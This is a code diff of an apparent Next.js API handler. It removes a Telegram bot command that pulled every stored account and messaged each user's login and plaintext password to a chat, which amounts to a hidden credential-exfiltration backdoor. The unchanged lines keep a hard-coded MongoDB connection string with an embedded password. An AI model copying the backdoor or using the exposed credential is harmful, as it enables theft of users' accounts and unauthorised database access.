@@ -9,21 +9,6 @@ export default async function handler(req, res) {
 		'mongodb+srv://boburkomilob:9bOUrZSnvxBr54JY@cluster0.v5eor.mongodb.net/?retryWrites=true&w=majority';
 
 	mongoose.connect(LOCAL_URL).catch((error) => console.log(error.message));
-	bot.launch();
-
-	bot.command('getData', async (ctx) => {
-		try {
-			const users = await Account.find({});
-			users.forEach((element) => {
-				bot.telegram.sendMessage(
-					ctx.chat.id,
-					`Login: ${element.login}; Password: ${element.password}`
-				);
-			});
-		} catch (error) {
-			res.status(400).json({ success: false });
-		}
-	});
 
 	switch (method) {
 		case 'GET':
